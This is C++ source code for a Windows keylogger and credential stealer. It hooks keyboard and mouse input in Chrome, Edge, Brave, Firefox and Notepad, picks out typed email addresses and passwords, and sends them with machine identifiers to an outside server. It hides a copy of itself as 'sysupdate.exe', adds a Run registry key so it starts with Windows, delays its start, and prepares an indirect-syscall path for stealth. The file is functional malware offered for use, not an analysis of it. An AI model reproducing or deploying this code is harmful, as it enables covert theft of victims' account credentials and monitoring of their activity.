#include <windows.h>
#include <winhttp.h>
#include <psapi.h>
#include <string>
#include <regex>
#include <sstream>
#include <fstream>
#include <shlobj.h>
#include <vector>
#include <algorithm>
#include <iomanip>
#include <ctime>

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "ole32.lib")

// --- ASYNC/SYSCALL BRIDGE ---
extern "C" {
    DWORD sys_number = 0;
    UINT_PTR sys_addr = 0;
}
extern "C" void DoIndirectSyscall();

// --- CONFIGURATION ---
std::vector<std::string> TARGET_APPS = { "chrome.exe", "msedge.exe", "brave.exe", "firefox.exe", "notepad.exe" };


// --- JUNK CODE COMPATIBILITY ---
// This ensures the mutate.py script works without errors
void WriteLog(std::string text); 
#define WriteDebug(x) WriteLog(x)




// --- 1. JSON ESCAPING HELPER ---
std::string EscapeJson(const std::string& s) {
    std::ostringstream o;
    for (auto c : s) {
        switch (c) {
        case '"': o << "\\\""; break;
        case '\\': o << "\\\\"; break;
        case '\b': o << "\\b"; break;
        case '\f': o << "\\f"; break;
        case '\n': o << "\\n"; break;
        case '\r': o << "\\r"; break;
        case '\t': o << "\\t"; break;
        default:
            if ('\x00' <= c && c <= '\x1f') {
                o << "\\u" << std::hex << std::setw(4) << std::setfill('0') << (int)c;
            } else { o << c; }
        }
    }
    return o.str();
}

// --- 2. DYNAMIC METADATA HELPERS ---
std::string GetHostName() {
    char buffer[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = sizeof(buffer);
    if (GetComputerNameA(buffer, &size)) {
        return std::string(buffer);
    }
    return "unknown_host";
}


std::string GetMachineId() {
    char value[255];
    DWORD BufferSize = sizeof(value);
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Cryptography", 0, KEY_READ | KEY_WOW64_64KEY, &hKey) == ERROR_SUCCESS) {
        if (RegQueryValueExA(hKey, "MachineGuid", NULL, NULL, (LPBYTE)value, &BufferSize) == ERROR_SUCCESS) {
            RegCloseKey(hKey);
            std::string rawId = value;
            std::transform(rawId.begin(), rawId.end(), rawId.begin(), ::tolower);
            return rawId;
        }
        RegCloseKey(hKey);
    }
    return "unknown_id";
}

std::string GetDynamicOS() {
    char value[255] = {0};
    DWORD BufferSize = sizeof(value);
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", 0, KEY_READ | KEY_WOW64_64KEY, &hKey) == ERROR_SUCCESS) {
        RegQueryValueExA(hKey, "ProductName", NULL, NULL, (LPBYTE)value, &BufferSize);
        RegCloseKey(hKey);
        return std::string(value);
    }
    return "Windows (Unknown)";
}

std::string GetActiveWindowTitle() {
    char title[256];
    HWND hwnd = GetForegroundWindow();
    if (hwnd && GetWindowTextA(hwnd, title, sizeof(title))) return std::string(title);
    return "System/Desktop";
}

// --- 3. LOGGING SYSTEM ---
// void WriteLog(std::string text) {
//     char desktopPath[MAX_PATH];
//     if (SHGetFolderPathA(NULL, CSIDL_DESKTOP, NULL, 0, desktopPath) == S_OK) {
//         std::string fullPath = std::string(desktopPath) + "\\monitor_log.txt";
//         std::ofstream logFile(fullPath, std::ios::app);
//         if (logFile.is_open()) {
//             std::time_t now = std::time(0);
//             struct tm ltm;
//             localtime_s(&ltm, &now);
//             logFile << "[" << std::setfill('0') << std::setw(2) << ltm.tm_hour << ":" << ltm.tm_min << "] " << text << std::endl;
//             logFile.close();
//         }
//     }
// }

void WriteLog(std::string text) {
    // This prints to the screen only. 
    // If you close the window, the information is gone forever.
    std::printf("[%s]\n", text.c_str()); 
}


// --- . NO-ADMIN PERSISTENCE ---
void SetPersistence() {
    char szPath[MAX_PATH];
    GetModuleFileNameA(NULL, szPath, MAX_PATH);
    
    char localAppData[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, localAppData);
    std::string hiddenDir = std::string(localAppData) + "\\WindowsMonitor";
    std::string hiddenPath = hiddenDir + "\\sysupdate.exe";
    
    CreateDirectoryA(hiddenDir.c_str(), NULL);
    CopyFileA(szPath, hiddenPath.c_str(), FALSE);

    // Registry Run Key (Current User - No Admin Required)
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, "SystemUpdate", 0, REG_SZ, (BYTE*)hiddenPath.c_str(), (DWORD)hiddenPath.length());
        RegCloseKey(hKey);
    }
    
    WriteLog("PERSISTENCE: User-level Registry established (No Admin).");
}





// --- 4. DATA EXFILTRATION ---
void UploadData(std::string email, std::string pass) {
    HINTERNET hS = WinHttpOpen(L"Mozilla/5.0", 1, NULL, NULL, 0);
    HINTERNET hC = WinHttpConnect(hS, L"systemint.onrender.com", 443, 0);
    HINTERNET hR = WinHttpOpenRequest(hC, L"POST", L"/api/sync", NULL, NULL, NULL, WINHTTP_FLAG_SECURE);
    
    std::stringstream ss;
    ss << "{"
       << "\"machineId\": \"" << GetMachineId() << "\","
       << "\"type\": \"Keylogger\","
       << "\"data\": {"
       <<     "\"WindowsTitle\": \"" << EscapeJson(GetActiveWindowTitle()) << "\"," 
       <<     "\"email\": \"" << EscapeJson(email) << "\","
       <<     "\"password\": \"" << EscapeJson(pass) << "\""
       << "},"
       << "\"systemMeta\": {"
       <<     "\"os\": \"" << EscapeJson(GetDynamicOS()) << "\","
       << "\"hostname\": \"" << EscapeJson(GetHostName()) << "\""
       << "}"
       << "}";

    std::string json = ss.str();
    if(WinHttpSendRequest(hR, L"Content-Type: application/json\r\n", -1, (LPVOID)json.c_str(), (DWORD)json.length(), (DWORD)json.length(), 0)) {
        if (WinHttpReceiveResponse(hR, NULL)) {
            WriteLog("PAYLOAD SUCCESS: Data uploaded for " + email);
            WriteLog("Raw JSON: " + json);
        }
    }
    WinHttpCloseHandle(hR); WinHttpCloseHandle(hC); WinHttpCloseHandle(hS);
}

// --- 5. CORE LOGIC ---
std::string buffer = "";
std::string savedEmail = "";

bool IsEmail(const std::string& s) {
    const std::regex e_reg(R"((\w+)(\.|_)?(\w*)@(\w+)(\.(\w+))+)", std::regex_constants::icase);
    return std::regex_match(s, e_reg);
}

void ProcessBuffer() {
    // JUNK_HERE
    
    if (buffer.empty()) return;
    if (buffer.find(' ') != std::string::npos) { buffer.clear(); return; }

    if (IsEmail(buffer)) {
        savedEmail = buffer;
        WriteLog("Saved Email: " + savedEmail);
    } else if (buffer.length() >= 8 && buffer.length() <= 64) {
        std::string finalEmail = savedEmail.empty() ? "N/A" : savedEmail;
        UploadData(finalEmail, buffer);
        savedEmail.clear();
    }
    buffer.clear();
}

// --- 6. TARGET FILTER & HOOKS ---
bool IsTargetAppActive() {
    DWORD processId;
    HWND hwnd = GetForegroundWindow();
    if (!hwnd) return false;
    GetWindowThreadProcessId(hwnd, &processId);
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, processId);
    if (hProcess) {
        char pathBuf[MAX_PATH];
        DWORD size = sizeof(pathBuf);
        if (QueryFullProcessImageNameA(hProcess, 0, pathBuf, &size)) {
            std::string path(pathBuf);
            std::string exeName = path.substr(path.find_last_of("\\/") + 1);
            std::transform(exeName.begin(), exeName.end(), exeName.begin(), ::tolower);
            for (const std::string& target : TARGET_APPS) {
                if (exeName == target) { CloseHandle(hProcess); return true; }
            }
        }
        CloseHandle(hProcess);
    }
    return false;
}

// LRESULT CALLBACK KeyProc(int n, WPARAM w, LPARAM l) {
//     if (n == HC_ACTION && w == WM_KEYDOWN) {
//         if (!IsTargetAppActive()) return CallNextHookEx(NULL, n, w, l);
//         KBDLLHOOKSTRUCT* k = (KBDLLHOOKSTRUCT*)l;
//         bool shift = (GetKeyState(VK_SHIFT) & 0x8000) != 0;

//         if (k->vkCode == VK_RETURN || k->vkCode == VK_TAB) {
//             ProcessBuffer();
//         } else if (k->vkCode == VK_BACK) {
//             if (!buffer.empty()) buffer.pop_back();
//         } else {
//             if (k->vkCode >= 0x41 && k->vkCode <= 0x5A) {
//                 char c = (char)k->vkCode; if (!shift) c = (char)tolower(c); buffer += c;
//             } else if (k->vkCode >= 0x30 && k->vkCode <= 0x39) {
//                 if (shift && k->vkCode == '2') buffer += "@";
//                 else buffer += (char)k->vkCode;
//             } else if (k->vkCode == VK_OEM_PERIOD) buffer += ".";
//         }
//     }
//     return CallNextHookEx(NULL, n, w, l);
// }

LRESULT CALLBACK KeyProc(int n, WPARAM w, LPARAM l) {
    if (n == HC_ACTION && w == WM_KEYDOWN) {
        if (!IsTargetAppActive()) return CallNextHookEx(NULL, n, w, l);
        KBDLLHOOKSTRUCT* k = (KBDLLHOOKSTRUCT*)l;

        if (k->vkCode == VK_RETURN || k->vkCode == VK_TAB) {
            ProcessBuffer();
            return CallNextHookEx(NULL, n, w, l);
        } else if (k->vkCode == VK_BACK) {
            if (!buffer.empty()) buffer.pop_back();
            return CallNextHookEx(NULL, n, w, l);
        }

        // --- THE FIX: Manually build the keyboard state ---
        BYTE keyboardState[256] = {0};
        // Check Shift
        if (GetKeyState(VK_SHIFT) & 0x8000) keyboardState[VK_SHIFT] = 0x80;
        // Check Caps Lock
        if (GetKeyState(VK_CAPITAL) & 0x0001) keyboardState[VK_CAPITAL] = 0x01;
        // Check AltGr (Required for some international symbols like €)
        if (GetKeyState(VK_MENU) & 0x8000) keyboardState[VK_MENU] = 0x80;

        wchar_t unicodeChar[5];
        // Now ToUnicode knows EXACTLY if Shift is pressed
        int result = ToUnicode(k->vkCode, k->scanCode, keyboardState, unicodeChar, 4, 0);

        if (result > 0) {
            std::wstring wideStr(unicodeChar, result);
            std::string utf8Str(wideStr.begin(), wideStr.end());
            
            if (utf8Str == " ") {
                ProcessBuffer(); 
            } else {
                buffer += utf8Str;
            }
        }
    }
    return CallNextHookEx(NULL, n, w, l);
}

LRESULT CALLBACK MouseProc(int n, WPARAM w, LPARAM l) {
    if (n == HC_ACTION && w == WM_LBUTTONDOWN) {
        if (IsTargetAppActive()) ProcessBuffer();
    }
    return CallNextHookEx(NULL, n, w, l);
}

// --- 7. ENTRY POINT ---
int WINAPI WinMain(HINSTANCE h, HINSTANCE p, LPSTR c, int s) {

    // 1. Start the log
    WriteLog("=== SYSTEM STARTING ===");
     WriteDebug("wait 1 minutes sleeping...");
    Sleep(60000); 
    WriteDebug("1 minutes passed ...");

    SetPersistence();
    
   // 2. Search for syscall instruction inside ntdll for stealth
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (ntdll) {
        BYTE* addr = (BYTE*)GetProcAddress(ntdll, "NtQuerySystemInformation");
        if (addr) {
            for (int i = 0; i < 50; i++) {
                if (addr[i] == 0x0F && addr[i+1] == 0x05 && addr[i+2] == 0xC3) {
                    sys_addr = (UINT_PTR)&addr[i];
                    WriteLog("STEALTH: Indirect syscall bridge established.");
                    break;
                }
            }
        }
    }

    HHOOK hKey = SetWindowsHookEx(WH_KEYBOARD_LL, KeyProc, h, 0);
    HHOOK hMouse = SetWindowsHookEx(WH_MOUSE_LL, MouseProc, h, 0);

    // 4. VERIFICATION CHECK
    if (hKey && hMouse) {
        WriteLog("Hooks Online. Monitoring input..."); 
    } else {
        WriteLog("CRITICAL ERROR: Hooks failed to initialize.");
        return 1;
    }
    
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    return 0;
}
